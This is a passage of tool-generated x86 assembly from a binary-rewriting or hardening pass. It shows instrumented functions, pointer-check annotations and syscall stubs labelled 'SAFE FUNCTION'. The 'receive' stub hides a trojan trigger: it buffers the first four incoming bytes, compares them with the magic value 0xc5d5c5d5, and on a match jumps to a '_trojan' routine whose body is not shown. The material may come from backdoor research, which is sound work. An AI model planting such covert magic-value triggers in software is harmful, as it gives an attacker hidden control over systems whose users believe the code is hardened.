   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:73 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 80   [[ SAFE FUNCTION ]]:  RECURSION STUB to Func_0x804b5b0
     adding function wrapper

;     Start Index : 3816 (0x804b5b0)
;       End Index : 3816 (0x804b5b0)
;   Num Instructs : 1
;      Stack Size : 0 (0x0)
;          Pushes : 0 (0x0)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 1
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 0
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 0
;      DOES NOT Have True Return; Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x3120,7
.p2align 3,0x3125
FuncPtr_0x804b5b0:

Func_0x804b5b0:

Label_0x804b5b0:
   jmp     Func_0x804b470 #32

/*;;;;;;;; 
; id:80 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 59
     adding function wrapper

;     Start Index : 3657 (0x804b410)
;       End Index : 3695 (0x804b468)
;   Num Instructs : 39
;      Stack Size : 16 (0x10)
;          Pushes : 3 (0x3)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 1
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 2
;      Local Vars : 0
;      ESP Others : 2
;     ESP Offsets : 4
;                 :  0x0(0x10), 0x4(0xc),
;      ESP Params : 
;                 :  0x20(0x4), 0x24(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 4
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x1120,7
.p2align 3,0x1125
FuncPtr_0x804b410:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x804b410,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x804b410:

Label_0x804b410:
   push    %ebx                               # [0(3657)]stackSize = 0x4   #32
   push    %edi                               # [1(3658)]stackSize = 0x8   #32
   push    %esi                               # [2(3659)]stackSize = 0xc   #32
   sub     $0x10, %esp                        # [3(3660)]stackSize = 0x1c   #32
   mov     0x24(%esp), %esi                   # [4(3661)]   #32
   mov     (%esi), %edi                       # [5(3662)]Using Pointer PTRCHECK arg[0]    #32
   xor     %eax, %eax                         # [6(3663)]   #32
   test    %edi, %edi                         # [7(3664)]   #32
   je      Label_0x804b462 #32
   mov     (%edi), %al                        # [9(3666)]Using Pointer PTRCHECK arg[0]    #32
   test    %al, %al                           # [10(3667)]   #32
   je      Label_0x804b44a #32
   mov     0x28(%esp), %ebx                   # [12(3669)]   #32
   add     $0x1, %edi                         # [13(3670)]   #32
Label_0x804b430: #p6a
   movsbl  %al, %eax                          # [14(3671)]   #32
   mov     %eax, 0x4(%esp)                    # [15(3672)]   #32
   mov     %ebx, (%esp)                       # [16(3673)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804b43a
   .long    Func_0x804b200  #pp1w: Label_0x804b200 VAR_ADDRESS #32
   test    %eax, %eax                         # [18(3675)]   #32
   jne     Label_0x804b450 #32
   mov     (%edi), %al                        # [20(3677)]Using Pointer PTRCHECK arg[0]    #32
   add     $0x1, %edi                         # [21(3678)]   #32
   test    %al, %al                           # [22(3679)]   #32
   jne     Label_0x804b430 #32
Label_0x804b44a: #p6a
   mov     (%esi), %eax                       # [24(3681)]Using Pointer PTRCHECK arg[0]  Already checked [5]   #32
   xor     %edi, %edi                         # [25(3682)]   #32
   jmp     Label_0x804b460 #32
Label_0x804b450: #p6a
   cmpb    $0x0, -0x1(%edi)                   # [27(3684)] Using pointer with negative offset PTRCHECK arg[1]    #32
   mov     (%esi), %eax                       # [28(3685)]Using Pointer PTRCHECK arg[0]  Already checked [5]# FLAGS USED   #32
   je      Label_0x804b45e #32
   movb    $0x0, -0x1(%edi)                   # [30(3687)] Using pointer with negative offset PTRCHECK arg[1]  Already checked [27]   #32
   jmp     Label_0x804b460 #32
Label_0x804b45e: #p6a
   xor     %edi, %edi                         # [32(3689)]   #32
Label_0x804b460: #p6a
   mov     %edi, (%esi)                       # [33(3690)]Using Pointer PTRCHECK arg[1]  Already checked [28, 24]   #32
Label_0x804b462: #p6a
   add     $0x10, %esp                        # [34(3691)]stackSize = 0xc   #32
   pop     %esi                               # [35(3692)]stackSize = 0x8   #32
   pop     %edi                               # [36(3693)]stackSize = 0x4   #32
   pop     %ebx                               # [37(3694)]stackSize = 0x0   #32
Label_0x804b468: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:59 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 76
     adding function wrapper

;     Start Index : 3202 (0x804aef0)
;       End Index : 3337 (0x804b0dd)
;   Num Instructs : 136
;      Stack Size : 44 (0x2c)
;          Pushes : 4 (0x4)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 5
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 3
;      Local Vars : 0
;      ESP Others : 10
;     ESP Offsets : 13
;                 :  0x0(0x2c), 0x4(0x28), 0x8(0x24), 0xc(0x20),
;                 :  0x10(0x1c), 0x14(0x18), 0x1c(0x10), 0x20(0xc),
;                 :  0x24(0x8), 0x28(0x4),
;      ESP Params : 
;                 :  0x40(0x4), 0x44(0x4), 0x48(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 5
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x6420,7
.p2align 3,0x6425
FuncPtr_0x804aef0:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x804aef0,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x804aef0:

Label_0x804aef0:
   push    %ebp                               # [0(3202)]stackSize = 0x4   #32
   push    %ebx                               # [1(3203)]stackSize = 0x8   #32
   push    %edi                               # [2(3204)]stackSize = 0xc   #32
   push    %esi                               # [3(3205)]stackSize = 0x10   #32
   sub     $0x2c, %esp                        # [4(3206)]stackSize = 0x3c   #32
   mov     0x48(%esp), %eax                   # [5(3207)]   #32
   mov     0x44(%esp), %ecx                   # [6(3208)]   #32
   mov     %ecx, 0x28(%esp)                   # [7(3209)]   #32
   mov     %eax, 0x24(%esp)                   # [8(3210)]   #32
   movl    $0x0, 0x20(%esp)                   # [9(3211)]   #32
   lea     0x4c(%esp), %eax                   # [10(3212)] Loading Pointer with stackSize: 60   #32
   mov     %eax, 0x1c(%esp)                   # [11(3213)]   #32
   jmp     Label_0x804af28 #32
Label_0x804af20: #p6a
   addl    $0x1, 0x28(%esp)                   # [13(3215)]Using Pointer PTRCHECK arg[0]  Already checked [96, 14]   #32
   addl    $0x1, 0x20(%esp)                   # [14(3216)]Using Pointer PTRCHECK arg[0]  Already checked [13]   #32
Label_0x804af28: #p6a
   mov     0x24(%esp), %eax                   # [15(3217)]   #32
   cmpb    $0x0, (%eax)                       # [16(3218)]Using Pointer PTRCHECK arg[1]    #32
   je      Label_0x804b0cb #32
   lea     0x1(%eax), %ecx                    # [18(3220)] Loading Pointer with stackSize: 60   #32
   mov     %ecx, 0x24(%esp)                   # [19(3221)]   #32
   mov     (%eax), %cl                        # [20(3222)]Using Pointer PTRCHECK arg[0]  Already checked [16]   #32
   xor     %eax, %eax                         # [21(3223)]   #32
   cmp     $0x25, %cl                         # [22(3224)]   #32
   mov     $0x0, %ebp                         # [23(3225)]# FLAGS USED   #32
   jne     Label_0x804b0c0 #32
   jmp     Label_0x804af53 #32
Label_0x804af50: #p6a
   or      $0x1, %ebp                         # [26(3228)]   #32
Label_0x804af53: #p6a
   mov     0x24(%esp), %ecx                   # [27(3229)]   #32
   lea     0x1(%ecx), %edx                    # [28(3230)] Loading Pointer with stackSize: 60   #32
   mov     %edx, 0x24(%esp)                   # [29(3231)]   #32
   mov     (%ecx), %cl                        # [30(3232)]Using Pointer PTRCHECK arg[0]    #32
   movsbl  %cl, %edx                          # [31(3233)]   #32
   cmp     $0x2f, %edx                        # [32(3234)]   #32
   jle     Label_0x804afa0 #32
   cmp     $0x57, %edx                        # [34(3236)]   #32
   jg      Label_0x804afb5 #32
   cmp     $0x30, %edx                        # [36(3238)]   #32
   je      Label_0x804af50 #32
   add     $-0x31, %edx                       # [38(3240)]   #32
   cmp     $0x9, %edx                         # [39(3241)]   #32
   jae     Label_0x804b0c0 #32
   mov     0x24(%esp), %eax                   # [41(3243)]   #32
   sub     $0x1, %eax                         # [42(3244)]   #32
   lea     0x24(%esp), %ecx                   # [43(3245)] Loading Pointer with stackSize: 60   #32
   mov     %ecx, 0x4(%esp)                    # [44(3246)]   #32
   mov     %eax, (%esp)                       # [45(3247)]   #32
   movl    $0xa, 0x8(%esp)                    # [46(3248)]   #32
   call    Func_0x804b470  #pp1: Label_0x804b470 VAR_ADDRESS #32
   jmp     Label_0x804af53 #32
Label_0x804afa0: #p6a
   cmp     $0x25, %edx                        # [49(3251)]   #32
   jne     Label_0x804b0c0 #32
   mov     0x28(%esp), %eax                   # [51(3253)]   #32
   movb    $0x25, (%eax)                      # [52(3254)]Using Pointer PTRCHECK arg[1]    #32
   jmp     Label_0x804af20 #32
Label_0x804afb5: #p6a
   cmp     $0x63, %edx                        # [54(3256)]   #32
   jg      Label_0x804afcb #32
   cmp     $0x58, %edx                        # [56(3258)]   #32
   jne     Label_0x804b0c0 #32
   or      $0x2, %ebp                         # [58(3260)]   #32
   jmp     Label_0x804b079 #32
Label_0x804afcb: #p6a
   cmp     $0x64, %edx                        # [60(3262)]   #32
   je      Label_0x804b025 #32
   cmp     $0x73, %edx                        # [62(3264)]   #32
   jne     Label_0x804b074 #32
   mov     0x1c(%esp), %eax                   # [64(3266)]   #32
   lea     0x4(%eax), %ecx                    # [65(3267)] Loading Pointer with stackSize: 60   #32
   mov     %ecx, 0x1c(%esp)                   # [66(3268)]   #32
   mov     (%eax), %ebp                       # [67(3269)]Using Pointer PTRCHECK arg[0]    #32
   mov     %ebp, (%esp)                       # [68(3270)]   #32
   call    Func_0x804b2e0  #pp1: Label_0x804b2e0 VAR_ADDRESS #32
   test    %eax, %eax                         # [70(3272)]   #32
   je      Label_0x804af28 #32
   mov     0x28(%esp), %ebx                   # [72(3274)]   #32
   xor     %edi, %edi                         # [73(3275)]   #32
   mov     0x20(%esp), %esi                   # [74(3276)]   #32
Label_0x804b000: #p6a
   mov     (%ebp, %edi ,  0x1), %al           # [75(3277)]Using Pointer PTRCHECK arg[0]    # <<<=== Did not find EBP Index
   mov     %al, (%ebx, %edi ,  0x1)           # [76(3278)]Using Pointer PTRCHECK arg[1]    # <<<=== Need to Address an Array
   add     $0x1, %edi                         # [77(3279)]   #32
   mov     %ebp, (%esp)                       # [78(3280)]   #32
   call    Func_0x804b2e0  #pp1: Label_0x804b2e0 VAR_ADDRESS #32
   cmp     %eax, %edi                         # [80(3282)]   #32
   jb      Label_0x804b000 #32
   add     %edi, %ebx                         # [82(3284)]   #32
   mov     %ebx, 0x28(%esp)                   # [83(3285)]   #32
   add     %edi, %esi                         # [84(3286)]   #32
   mov     %esi, 0x20(%esp)                   # [85(3287)]   #32
   jmp     Label_0x804af28 #32
Label_0x804b025: #p6a
   mov     0x1c(%esp), %ecx                   # [87(3289)]   #32
   lea     0x4(%ecx), %edx                    # [88(3290)] Loading Pointer with stackSize: 60   #32
   mov     %edx, 0x1c(%esp)                   # [89(3291)]   #32
   mov     (%ecx), %ecx                       # [90(3292)]Using Pointer PTRCHECK arg[0]    #32
   test    %ecx, %ecx                         # [91(3293)]   #32
   jns     Label_0x804b047 #32
   mov     0x28(%esp), %edx                   # [93(3295)]   #32
   movb    $0x2d, (%edx)                      # [94(3296)]Using Pointer PTRCHECK arg[1]    #32
   addl    $0x1, 0x28(%esp)                   # [95(3297)]Using Pointer PTRCHECK arg[0]  Already checked [96, 14]   #32
   addl    $0x1, 0x20(%esp)                   # [96(3298)]Using Pointer PTRCHECK arg[0]  Already checked [95]   #32
   neg     %ecx                               # [97(3299)]   #32
Label_0x804b047: #p6a
   mov     %ebp, 0x14(%esp)                   # [98(3300)]   #32
   mov     %eax, 0x10(%esp)                   # [99(3301)]   #32
   mov     %ecx, 0x8(%esp)                    # [100(3302)]   #32
   lea     0x28(%esp), %eax                   # [101(3303)] Loading Pointer with stackSize: 60   #32
   mov     %eax, 0x4(%esp)                    # [102(3304)]   #32
   lea     0x20(%esp), %eax                   # [103(3305)] Loading Pointer with stackSize: 60   #32
   mov     %eax, (%esp)                       # [104(3306)]   #32
   movl    $0xa, 0xc(%esp)                    # [105(3307)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804b06a
   .long    Func_0x804ae20  #pp1w: Label_0x804ae20 VAR_ADDRESS #32
   jmp     Label_0x804af28 #32
Label_0x804b074: #p6a
   cmp     $0x78, %edx                        # [108(3310)]   #32
   jne     Label_0x804b0c0 #32
Label_0x804b079: #p6a
   mov     0x1c(%esp), %ecx                   # [110(3312)]   #32
   lea     0x4(%ecx), %edx                    # [111(3313)] Loading Pointer with stackSize: 60   #32
   mov     %edx, 0x1c(%esp)                   # [112(3314)]   #32
   mov     (%ecx), %ecx                       # [113(3315)]Using Pointer PTRCHECK arg[0]    #32
   mov     %ebp, 0x14(%esp)                   # [114(3316)]   #32
   mov     %eax, 0x10(%esp)                   # [115(3317)]   #32
   mov     %ecx, 0x8(%esp)                    # [116(3318)]   #32
   lea     0x28(%esp), %eax                   # [117(3319)] Loading Pointer with stackSize: 60   #32
   mov     %eax, 0x4(%esp)                    # [118(3320)]   #32
   lea     0x20(%esp), %eax                   # [119(3321)] Loading Pointer with stackSize: 60   #32
   mov     %eax, (%esp)                       # [120(3322)]   #32
   movl    $0x10, 0xc(%esp)                   # [121(3323)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804b0a9
   .long    Func_0x804ae20  #pp1w: Label_0x804ae20 VAR_ADDRESS #32
   jmp     Label_0x804af28 #32
Label_0x804b0c0: #p6a
   mov     0x28(%esp), %eax                   # [124(3326)]   #32
   mov     %cl, (%eax)                        # [125(3327)]Using Pointer PTRCHECK arg[1]    #32
   jmp     Label_0x804af20 #32
Label_0x804b0cb: #p6a
   mov     0x28(%esp), %eax                   # [127(3329)]   #32
   movb    $0x0, (%eax)                       # [128(3330)]Using Pointer PTRCHECK arg[1]    #32
   mov     0x20(%esp), %eax                   # [129(3331)]   #32
   add     $0x2c, %esp                        # [130(3332)]stackSize = 0x10   #32
   pop     %esi                               # [131(3333)]stackSize = 0xc   #32
   pop     %edi                               # [132(3334)]stackSize = 0x8   #32
   pop     %ebx                               # [133(3335)]stackSize = 0x4   #32
   pop     %ebp                               # [134(3336)]stackSize = 0x0   #32
Label_0x804b0dd: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:76 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 0   [[ SAFE FUNCTION ]]: _start
     adding function wrapper

;     Start Index : 3817 (0x804b5b5)
;       End Index : 3820 (0x804b5c0)
;   Num Instructs : 4; Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; Calls syscall terminate

;
;-------------------------*/

.p2align 4,0x320,7
.p2align 3,0x325
FuncPtr_0x804b5b5:

Func_0x804b5b5:

_start:

_Fnstart:
   movl    %ecx, (_RAND_Page)
   movl    0x144(%ecx), %eax
   xorl    0x237(%ecx), %eax
   movl    %eax, (_RAND)
   movl    %ecx, %eax
   notl    %eax
   andl    $0xFFFFF000, %eax
   movl    %eax, (_Not_RAND_Page)
   xorl    %eax, %eax

Label_0x804b5b5:
#  call _crcx
 #32
   call    _FuncWrapperHeader      # 2. my address is 0x804b5ba
   .long    Func_0x8049630  #pp1w: Label_0x8049630 VAR_ADDRESS #32
   push    %eax                               #   #32
   call    _terminate                         #  System Call to terminate() #32
   jmp  Func_0x804b5c5   # to protect from badPatch

/*;;;;;;;; 
; id:0 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 78
     adding function wrapper

;     Start Index : 3511 (0x804b2a0)
;       End Index : 3535 (0x804b2dd)
;   Num Instructs : 25
;      Stack Size : 16 (0x10)
;          Pushes : 3 (0x3)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 3
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 1
;      Local Vars : 0
;      ESP Others : 3
;     ESP Offsets : 4
;                 :  0x0(0x10), 0x4(0xc), 0x8(0x8),
;      ESP Params : 
;                 :  0x20(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x9620,7
.p2align 3,0x9625
FuncPtr_0x804b2a0:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x804b2a0,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x804b2a0:

Label_0x804b2a0:
   push    %ebx                               # [0(3511)]stackSize = 0x4   #32
   push    %edi                               # [1(3512)]stackSize = 0x8   #32
   push    %esi                               # [2(3513)]stackSize = 0xc   #32
   sub     $0x10, %esp                        # [3(3514)]stackSize = 0x1c   #32
   mov     0x24(%esp), %ebx                   # [4(3515)]   #32
   mov     %ebx, (%esp)                       # [5(3516)]   #32
   call    Func_0x804b2e0  #pp1: Label_0x804b2e0 VAR_ADDRESS #32
   mov     %eax, %esi                         # [7(3518)]   #32
   add     $0x1, %esi                         # [8(3519)]   #32
   mov     %esi, (%esp)                       # [9(3520)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804b2b8
   .long    Func_0x804a560  #pp1w: Label_0x804a560 VAR_ADDRESS #32
   mov     %eax, %edi                         # [11(3522)]   #32
   xor     %eax, %eax                         # [12(3523)]   #32
   test    %edi, %edi                         # [13(3524)]   #32
   je      Label_0x804b2d7 #32
   mov     %esi, 0x8(%esp)                    # [15(3526)]   #32
   mov     %ebx, 0x4(%esp)                    # [16(3527)]   #32
   mov     %edi, (%esp)                       # [17(3528)]   #32
   call    Func_0x804a9d0  #pp1: Label_0x804a9d0 VAR_ADDRESS #32
   mov     %edi, %eax                         # [19(3530)]   #32
Label_0x804b2d7: #p6a
   add     $0x10, %esp                        # [20(3531)]stackSize = 0xc   #32
   pop     %esi                               # [21(3532)]stackSize = 0x8   #32
   pop     %edi                               # [22(3533)]stackSize = 0x4   #32
   pop     %ebx                               # [23(3534)]stackSize = 0x0   #32
Label_0x804b2dd: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:78 Patched 0 in 0.0 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 79
     adding function wrapper

;     Start Index : 3546 (0x804b300)
;       End Index : 3592 (0x804b374)
;   Num Instructs : 47
;      Stack Size : 12 (0xc)
;          Pushes : 4 (0x4)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 4
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 3
;      Local Vars : 0
;      ESP Others : 1
;     ESP Offsets : 4
;                 :  0x0(0xc),
;      ESP Params : 
;                 :  0x20(0x4), 0x24(0x4), 0x28(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 3
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x7120,7
.p2align 3,0x7125
FuncPtr_0x804b300:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x804b300,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x804b300:

Label_0x804b300:
   push    %ebp                               # [0(3546)]stackSize = 0x4   #32
   push    %ebx                               # [1(3547)]stackSize = 0x8   #32
   push    %edi                               # [2(3548)]stackSize = 0xc   #32
   push    %esi                               # [3(3549)]stackSize = 0x10   #32
   sub     $0xc, %esp                         # [4(3550)]stackSize = 0x1c   #32
   xor     %esi, %esi                         # [5(3551)]   #32
   mov     0x2c(%esp), %ebp                   # [6(3552)]   #32
   test    %ebp, %ebp                         # [7(3553)]   #32
   je      Label_0x804b36b #32
   mov     0x28(%esp), %edi                   # [9(3555)]   #32
   mov     0x24(%esp), %ebx                   # [10(3556)]   #32
   jmp     Label_0x804b322 #32
Label_0x804b320: #p6a
   add     $0x1, %ebx                         # [12(3558)]   #32
   add     $0x1, %edi                         # [13(3559)]   #32
Label_0x804b322: #p6a
   cmp     $0x1, %ebp                         # [14(3560)]   #32
   je      Label_0x804b351 #32
   movzbl  (%ebx), %eax                       # [16(3562)]Using Pointer PTRCHECK arg[0]    #32
   test    %eax, %eax                         # [17(3563)]   #32
   je      Label_0x804b351 #32
   mov     (%edi), %cl                        # [19(3565)]Using Pointer PTRCHECK arg[0]    #32
   test    %cl, %cl                           # [20(3566)]   #32
   je      Label_0x804b351 #32
   cmp     %cl, %al                           # [22(3568)]   #32
   je      Label_0x804b320 #32
   mov     %eax, (%esp)                       # [24(3570)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804b33b
   .long    Func_0x804a4a0  #pp1w: Label_0x804a4a0 VAR_ADDRESS #32
   mov     %eax, %esi                         # [26(3572)]   #32
   movzbl  (%edi), %eax                       # [27(3573)]Using Pointer PTRCHECK arg[0]  Already checked [19]   #32
   mov     %eax, (%esp)                       # [28(3574)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804b348
   .long    Func_0x804a4a0  #pp1w: Label_0x804a4a0 VAR_ADDRESS #32
   cmp     %eax, %esi                         # [30(3576)]   #32
   je      Label_0x804b320 #32
Label_0x804b351: #p6a
   movzbl  (%ebx), %eax                       # [32(3578)]Using Pointer PTRCHECK arg[0]  Already checked [16]   #32
   mov     %eax, (%esp)                       # [33(3579)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804b357
   .long    Func_0x804a4a0  #pp1w: Label_0x804a4a0 VAR_ADDRESS #32
   mov     %eax, %esi                         # [35(3581)]   #32
   movzbl  (%edi), %eax                       # [36(3582)]Using Pointer PTRCHECK arg[0]  Already checked [27, 19]   #32
   mov     %eax, (%esp)                       # [37(3583)]   #32
   call    _FuncWrapperHeader      # 2. my address is 0x804b364
   .long    Func_0x804a4a0  #pp1w: Label_0x804a4a0 VAR_ADDRESS #32
   sub     %eax, %esi                         # [39(3585)]   #32
Label_0x804b36b: #p6a
   mov     %esi, %eax                         # [40(3586)]   #32
   add     $0xc, %esp                         # [41(3587)]stackSize = 0x10   #32
   pop     %esi                               # [42(3588)]stackSize = 0xc   #32
   pop     %edi                               # [43(3589)]stackSize = 0x8   #32
   pop     %ebx                               # [44(3590)]stackSize = 0x4   #32
   pop     %ebp                               # [45(3591)]stackSize = 0x0   #32
Label_0x804b374: #p6a
   jmp     _FuncWrapperFooter
 # Ret here

/*;;;;;;;; 
; id:79 Patched 0 in 0.001 seconds
;;;;;;;*/ 


/*-------------------------
;
;   Function 61   [[ SAFE FUNCTION ]]: terminate
     adding function wrapper

;     Start Index : 3821 (0x804b5c5)
;       End Index : 3826 (0x804b5d2)
;   Num Instructs : 6
;      Stack Size : 0 (0x0)
;          Pushes : 1 (0x1)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 1
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 1
;      ESP Params : 
;                 :  0x8(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x5720,7
.p2align 3,0x5725
FuncPtr_0x804b5c5:

Func_0x804b5c5:

_terminate:

Label_0x804b5c5:
   mov    $0x1,%eax
   mov    0x8(%esp),%ebx        # get exit code
   int    $0x80
_transmitOrig:
   mov     $0x2, %eax
   push    %ebx
   push    %ecx
   push    %edx
   push    %esi
   mov     0x1c(%esp), %ebx
   mov     0x20(%esp), %ecx
   mov     0x24(%esp), %edx
   mov     0x28(%esp), %esi
   int     $0x80
   pop     %esi
   pop     %edx
   pop     %ecx
   pop     %ebx
   ret
_receiveOrig:
   mov     $0x3, %eax
   push    %ebx
   push    %ecx
   push    %edx
   push    %esi
   mov     0x14(%esp), %ebx
   mov     0x18(%esp), %ecx
   mov     0x1c(%esp), %edx
   mov     0x20(%esp), %esi
   int     $0x80
   pop     %esi
   pop     %edx
   pop     %ecx
   pop     %ebx
   ret


/*-------------------------
;
;   Function 62   [[ SAFE FUNCTION ]]: transmit
     adding function wrapper

;     Start Index : 3827 (0x804b5d3)
;       End Index : 3841 (0x804b5f2)
;   Num Instructs : 15
;      Stack Size : 0 (0x0)
;          Pushes : 4 (0x4)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 4
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 4
;      ESP Params : 
;                 :  0x14(0x4), 0x18(0x4), 0x1c(0x4), 0x20(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x3520,7
.p2align 3,0x3525
FuncPtr_0x804b5d3:

Func_0x804b5d3:

_transmit:

Label_0x804b5d3:
   mov     $0x47, %eax
   push    %ebx
   push    %ecx
   push    %edx
   push    %esi
   mov     0x14(%esp), %ebx
   mov     0x18(%esp), %ecx
   and     $0xFFFFF000, %ecx
   cmpl    (_RAND_Page), %ecx
   je      _terminate
   mov     0x18(%esp), %ecx
   mov     0x1c(%esp), %edx
   mov     0x20(%esp), %esi
   xor     $0x45, %eax
   int     $0x80
   pop     %esi
   pop     %edx
   pop     %ecx
   pop     %ebx
   ret


/*-------------------------
;
;   Function 63   [[ SAFE FUNCTION ]]: receive
     adding function wrapper

;     Start Index : 3842 (0x804b5f3)
;       End Index : 3856 (0x804b612)
;   Num Instructs : 15
;      Stack Size : 0 (0x0)
;          Pushes : 4 (0x4)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 0
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 4
;      Local Vars : 0
;      ESP Others : 0
;     ESP Offsets : 4
;      ESP Params : 
;                 :  0x14(0x4), 0x18(0x4), 0x1c(0x4), 0x20(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 0
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x1920,7
.p2align 3,0x1925
FuncPtr_0x804b5f3:

Func_0x804b5f3:

_receive:

Label_0x804b5f3:
   mov     $0x77, %eax
   push    %ebx
   push    %ecx
   push    %edx
   push    %esi
   mov     0x14(%esp), %ebx
   mov     0x18(%esp), %ecx
   mov     0x1c(%esp), %edx
   mov     0x20(%esp), %esi
   xorl    $0x74, %eax
   int     $0x80
   movl    (_InCnt),%ebx
   cmpl   $4,%ebx
   jb      _testTrojan
_leaveReceive:
   pop     %esi
   pop     %edx
   pop     %ecx
   pop     %ebx
   ret
_testTrojan:
   testl   %eax,%eax
   jnz     _leaveReceive
   mov     0x1c(%esp), %edx
   mov     0x18(%esp), %ecx
   lea     _InMsg,%esi
   addl    %ebx,%esi
_copyLoop:
   cmpl    $0,%edx
   jle     _leaveReceive
   movl    (%ecx),%eax
   movl    %eax,(%esi)
   xorl    %eax,%eax
   addl    $1, %ebx
   movl    %ebx,(_InCnt)
   cmpl    $4,%ebx
   je      _trojanTest
   addl    $1,%ecx
   addl    $1,%esi
   subl    $1,%edx
   jmp     _copyLoop
_trojanTest:
   movl   (_InMsg),%ebx
   cmpl   $0xc5d5c5d5,%ebx
   jne    _leaveReceive
   jmp    _trojan


/*-------------------------
;
;   Function 83
     adding function wrapper

;     Start Index : 987 (0x8048ef0)
;       End Index : 1014 (0x8048f55)
;   Num Instructs : 28
;      Stack Size : 24 (0x18)
;          Pushes : 1 (0x1)
;      ESP in EBP : false
;    Prior Pushes : 0 (0x0)
;    Stack Adjust : 0 (0x0)
; Has Function Ptr: false
; Makes Calls: 2
;   Is Called: false
; Is Func Ptr Called: true
;
;      Parameters : 2
;      Local Vars : 0
;      ESP Others : 3
;     ESP Offsets : 5
;                 :  0x0(0x18), 0x4(0x14), 0x8(0x10),
;      ESP Params : 
;                 :  0x20(0x4), 0x24(0x4); Function Pointers : 0
; Patched Pointers : 0
; Safe Pointers : 2
; Checks Required : 0
; MaxLoopPatches : 0
; No calls to sys calls

;
;-------------------------*/

.p2align 4,0x4320,7
.p2align 3,0x4325
FuncPtr_0x8048ef0:
   lea    -0x4(%esp),%esp    #make room for canary & my return
   push    %eax
   movl    $Func_0x8048ef0,_CallAddress
   jmp    _FuncWrapperHeader1

Func_0x8048ef0:

Label_0x8048ef0:
   push    %esi                               # [0(987)]stackSize = 0x4   #32
   sub     $0x18, %esp                        # [1(988)]stackSize = 0x1c   #32
